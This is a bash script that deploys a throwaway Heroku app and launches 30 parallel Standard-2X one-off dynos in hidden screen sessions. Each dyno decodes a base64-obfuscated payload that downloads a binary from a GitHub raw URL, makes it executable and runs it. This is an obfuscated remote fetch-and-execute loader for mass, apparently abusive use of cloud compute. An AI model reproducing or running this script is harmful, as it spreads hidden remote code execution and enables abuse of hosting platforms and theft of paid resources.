#!/usr/bin/env bash
git config --global user.email heroku@gmail.com
git config --global user.name heroku
scmin=$(shuf -i 1-9999999999 -n 1)
sc1=$(shuf -i 1-9999999999 -n 1)
sc2=$(shuf -i 1-9999999999 -n 1)
sc3=$(shuf -i 1-9999999999 -n 1)
sc4=$(shuf -i 1-9999999999 -n 1)
sc5=$(shuf -i 1-9999999999 -n 1)
sc6=$(shuf -i 1-9999999999 -n 1)
sc7=$(shuf -i 1-9999999999 -n 1)
sc8=$(shuf -i 1-9999999999 -n 1)
sc9=$(shuf -i 1-9999999999 -n 1)
sc10=$(shuf -i 1-9999999999 -n 1)
sc11=$(shuf -i 1-9999999999 -n 1)
sc12=$(shuf -i 1-9999999999 -n 1)
sc13=$(shuf -i 1-9999999999 -n 1)
sc14=$(shuf -i 1-9999999999 -n 1)
sc15=$(shuf -i 1-9999999999 -n 1)
sc16=$(shuf -i 1-9999999999 -n 1)
sc17=$(shuf -i 1-9999999999 -n 1)
sc18=$(shuf -i 1-9999999999 -n 1)
sc19=$(shuf -i 1-9999999999 -n 1)
sc20=$(shuf -i 1-9999999999 -n 1)
sc21=$(shuf -i 1-9999999999 -n 1)
sc22=$(shuf -i 1-9999999999 -n 1)
sc23=$(shuf -i 1-9999999999 -n 1)
sc24=$(shuf -i 1-9999999999 -n 1)
sc25=$(shuf -i 1-9999999999 -n 1)
sc26=$(shuf -i 1-9999999999 -n 1)
sc27=$(shuf -i 1-9999999999 -n 1)
sc28=$(shuf -i 1-9999999999 -n 1)
sc29=$(shuf -i 1-9999999999 -n 1)
sc30=$(shuf -i 1-9999999999 -n 1)
scmin=$(shuf -i 1-9999999999 -n 1)
buildpack="heroku/python"
echo 'd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vZHNlODM0Ny9kci9yYXcvbWFpbi8yMgpjaG1vZCA3NzcgMjIKLi8yMgo' > run
echo 'web: bash' > Procfile
echo '*' > .gitignore
touch main.py requirements.txt
mv run $scmin
chmod +x $scmin
command="base64 $scmin -d | bash"
APP=app$(shuf -i 100000000-999999999 -n 1)
heroku create $APP --buildpack $buildpack &
sleep 10s
git init
heroku git:remote -a $APP
git add -f Procfile requirements.txt main.py $scmin
git commit -m upload
git push heroku master
sleep 1
heroku ps:scale web=0:Standard-2X -a $APP
sleep 1
screen -dmS $sc2 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc3 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc4 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc5 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc6 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc7 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc8 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc9 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc10 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc11 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc12 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc13 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc14 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc15 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc16 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc17 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc18 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc19 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc20 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc21 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc22 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc23 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc24 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc25 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc26 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc27 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc28 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc29 heroku run "$command" -a $APP --size=standard-2x
sleep 1
screen -dmS $sc30 heroku run "$command" -a $APP --size=standard-2x
sleep 1
echo "done"
screen -list
while :; do screen -list; sleep 10; clear; done
